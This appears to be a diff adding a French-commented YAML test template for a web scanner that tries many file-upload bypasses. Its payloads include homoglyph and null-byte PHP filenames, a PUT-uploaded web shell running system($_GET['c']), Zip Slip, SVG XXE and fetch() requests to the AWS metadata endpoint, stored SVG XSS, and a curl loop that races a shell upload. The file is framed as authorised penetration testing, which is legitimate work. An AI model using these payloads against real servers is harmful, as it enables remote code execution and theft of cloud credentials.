@@ -1,0 +1,311 @@
+# ═══════════════════════════════════════════════════════════════════════════
+#  Upload Bypass — Techniques avancées (angles morts du mega-template)
+#  Complément à 98_upload_bypass_mega.yaml
+#  ⚠ Usage strictement réservé aux environnements de test autorisés.
+#  [RUNE: ᛞ (Dagaz) - Percée, transformation, contournement des seuils]
+# ═══════════════════════════════════════════════════════════════════════════
+name: "Upload — Bypass avancé (Unicode, Archives, SSRF, Race)"
+
+variables:
+  base_url: "http://localhost:8080"
+  upload_path: "/upload"
+  upload_field: "file"
+  served_base: "/uploads"
+  canary: "MOWING_ADV_{{uuid}}"
+  # Domaine pour l'exfiltration OOB / SSRF (à remplacer par ton listener)
+  oob_domain: "collaborator.net"
+  # Chemin cible pour le Zip Slip (à adapter selon l'OS du serveur)
+  zipslip_target: "../../../tmp/shell.php"
+
+defaults:
+  read_timeout: 15
+  verify: false
+  retries: 0
+
+tests:
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE A — Unicode / Fullwidth bypass (anti-blacklist avancé)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_fullwidth_php
+    name: "Bypass — Fullwidth Unicode (ｐｈｐ au lieu de php)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # U+FF50 U+FF48 U+FF50 = ｐｈｐ (fullwidth)
+          # Certains parseurs Windows/PHP normalisent ça en .php après le filtre
+          filename: "shell.ｐｈｐ"
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n<?php echo '{{canary}}'; ?>"
+      headers:
+        # Force l'UTF-8 dans le Content-Disposition
+        Content-Type: "multipart/form-data; charset=utf-8"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(not allowed|forbidden|invalid extension)"
+
+  - id: upload_bypass_cyrillic_a
+    name: "Bypass — Cyrillic homoglyph (а au lieu de a)"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # U+0430 (а) ressemble à 'a' mais n'est pas ASCII
+          filename: "shell.phа"
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE B — Null byte & legacy bypass
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_nullbyte
+    name: "Bypass — Null byte (shell.php%00.jpg)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # Le %00 tronque la chaîne pour les parseurs C-style (PHP < 5.3.4)
+          filename: "shell.php%00.jpg"
+          content_type: "image/jpeg"
+          content: "<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(invalid|forbidden)"
+
+  - id: upload_bypass_semicolon_apache
+    name: "Bypass — Semicolon Apache (shell.php;.jpg)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # Apache ignore tout après le ; dans le nom de fichier
+          filename: "shell.php;.jpg"
+          content_type: "image/jpeg"
+          content: "<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE C — Content-Disposition RFC 5987 (filename* UTF-8)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_content_disposition_utf8
+    name: "Bypass — Content-Disposition UTF-8 encoded (filename*)"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      # Raw multipart pour contrôler exactement le Content-Disposition
+      raw_multipart: >-
+        --boundary123\r\n
+        Content-Disposition: form-data; name="{{upload_field}}"; filename*=UTF-8''shell%2Ephp\r\n
+        Content-Type: image/jpeg\r\n
+        \r\n
+        <?php echo '{{canary}}'; ?>\r\n
+        --boundary123--
+      headers:
+        Content-Type: "multipart/form-data; boundary=boundary123"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(not allowed|forbidden)"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE D — PUT direct (sans multipart)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_put_direct_php
+    name: "Bypass — PUT direct (sans multipart, shell.php)"
+    severity: high
+    request:
+      method: PUT
+      path: "{{served_base}}/shell_put.php"
+      headers:
+        Content-Type: "application/x-httpd-php"
+      body: "<?php echo '{{canary}}'; system($_GET['c']); ?>"
+    assert:
+      - status: [200, 201, 204]
+      - body_not_regex: "(?i)(method not allowed|405)"
+
+  - id: upload_put_direct_jpg
+    name: "Bypass — PUT direct avec extension .jpg (pour .htaccess)"
+    severity: high
+    request:
+      method: PUT
+      path: "{{served_base}}/shell_put.jpg"
+      headers:
+        Content-Type: "image/jpeg"
+      body: "<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 204]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE E — Iterative strip bypass
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_bypass_iterative_strip
+    name: "Bypass — Iterative strip (shell.php.jpg.jpg.jpg)"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # Si l'appli strip .jpg puis re-vérifie, ça peut passer
+          filename: "shell.php.jpg.jpg.jpg"
+          content_type: "image/jpeg"
+          content: "\xFF\xD8\xFF\xE0<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_bypass_space_after_extension
+    name: "Bypass — Espace après extension (shell.php )"
+    severity: medium
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          # Windows strip les espaces de fin, Unix les garde
+          filename: "shell.php "
+          content_type: "image/png"
+          content: "\x89PNG\r\n\x1a\n<?php echo '{{canary}}'; ?>"
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE F — Archive malicieuse (Zip Slip)
+  #  ⚠ Nécessite le script generate_malicious_zip.py pour créer le ZIP
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_zipslip
+    name: "Archive — Zip Slip (extraction avec path traversal)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "archive.zip"
+          content_type: "application/zip"
+          # Base64 d'un ZIP crafté contenant ../../../tmp/shell.php
+          # Générer avec: python3 generate_malicious_zip.py
+          content_b64_file: "malicious.zip.b64"
+    assert:
+      - status: [200, 201, 202]
+      - body_not_regex: "(?i)(archive not allowed|forbidden)"
+
+  - id: upload_zipslip_verify
+    name: "Vérification — Zip Slip a-t-il écrit le shell ?"
+    severity: critical
+    request:
+      method: GET
+      # Chemin cible après extraction (à adapter)
+      path: "/tmp/shell.php"
+    assert:
+      - status: 200
+      - body_contains: "<?php"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE G — SSRF / XXE via SVG
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_svg_ssrf_xxe
+    name: "SSRF — SVG avec XXE (exfiltration metadata AWS)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "ssrf.svg"
+          content_type: "image/svg+xml"
+          content: >-
+            <?xml version="1.0" standalone="yes"?>
+            <!DOCTYPE svg [
+              <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+            ]>
+            <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+              <text x="10" y="40" font-size="12">&xxe;</text>
+            </svg>
+    assert:
+      - status: [200, 201, 202]
+      # Si le SVG est rendu et que l'entité est résolue, on verra les metadata AWS
+      - body_regex: "(?i)(ami-id|instance-id|local-ipv4|iam)"
+
+  - id: upload_svg_ssrf_internal
+    name: "SSRF — SVG avec fetch() vers réseau interne"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "ssrf_fetch.svg"
+          content_type: "image/svg+xml"
+          content: >-
+            <?xml version="1.0" standalone="yes"?>
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+              <script type="text/javascript">
+                fetch('http://169.254.169.254/latest/meta-data/')
+                  .then(r => r.text())
+                  .then(t => document.getElementById('out').textContent = t);
+              </script>
+              <text id="out" x="10" y="40">Loading...</text>
+            </svg>
+    assert:
+      - status: [200, 201, 202]
+
+  - id: upload_svg_xss_stored
+    name: "XSS — SVG avec onload (exécution JS côté client)"
+    severity: high
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "xss.svg"
+          content_type: "image/svg+xml"
+          content: >-
+            <?xml version="1.0" standalone="yes"?>
+            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('{{canary}}')">
+              <rect width="100" height="100" fill="red"/>
+            </svg>
+    assert:
+      - status: [200, 201, 202]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PHASE H — Race condition (TOCTOU)
+  #  ⚠ Nécessite un script parallèle pour fonctionner
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: upload_race_condition_setup
+    name: "Race — TOCTOU upload (fichier légitime, remplacé en course)"
+    severity: critical
+    request:
+      method: POST
+      path: "{{upload_path}}"
+      form_data:
+        "{{upload_field}}":
+          filename: "legit.png"
+          content_type: "image/png"
+          # Faux PNG, sera remplacé par un shell via script parallèle
+          content: "\x89PNG\r\n\x1a\n"
+    assert:
+      - status: [200, 201, 202]
+    # Note: lancer en parallèle avec:
+    # while true; do curl -F "file=@shell.php" http://target/upload; done
+
+  - id: upload_race_condition_verify
+    name: "Vérification — Race condition a-t-elle fonctionné ?"
+    severity: critical
+    request:
+      method: GET
+      path: "{{served_base}}/legit.png"
+    assert:
+      - status: 200
+      # Si le fichier contient du PHP, la race a réussi
+      - body_regex: "(?i)(<\?php|system|exec)"
